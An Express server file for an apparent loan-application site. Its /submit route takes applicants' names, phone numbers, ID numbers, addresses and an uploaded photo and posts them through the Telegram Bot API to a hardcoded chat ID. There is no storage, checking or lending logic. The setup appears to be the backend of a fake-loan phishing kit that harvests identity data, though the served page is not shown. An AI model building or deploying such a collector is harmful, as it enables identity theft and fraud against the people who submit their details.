const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID || process.env.TELEGRAM_CHAT_ID || '8218642511';

console.log('Bot Token exists:', !!BOT_TOKEN);
console.log('Chat ID:', CHAT_ID);

app.use(express.static(__dirname));
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/submit', upload.single('photo'), async (req, res) => {
  try {
    const data = req.body;
    let message = `🚨 NEW LOAN APPLICATION\n\n`;
    message += `Name: ${data.fullName || ''}\n`;
    message += `Phone: ${data.phone || ''}\n`;
    message += `ID: ${data.idNumber || ''}\n`;
    message += `Amount: ${data.loanAmount || ''}\n`;
    message += `Duration: ${data.duration || ''}\n`;
    message += `Work: ${data.occupation || ''}\n`;
    message += `Address: ${data.address || ''}\n`;

    console.log('Sending to Telegram:', CHAT_ID);
    
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message
    });

    console.log('Message sent!');

    if (req.file) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', req.file.buffer, { filename: 'photo.jpg' });
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders()
      });
      console.log('Photo sent!');
    }

    res.json({ success: true });
  } catch (e) {
    console.log('TELEGRAM ERROR:', e.response ? e.response.data : e.message);
    res.json({ success: false, error: e.message });
  }
});

app.listen(PORT, () => console.log('Live on ' + PORT));
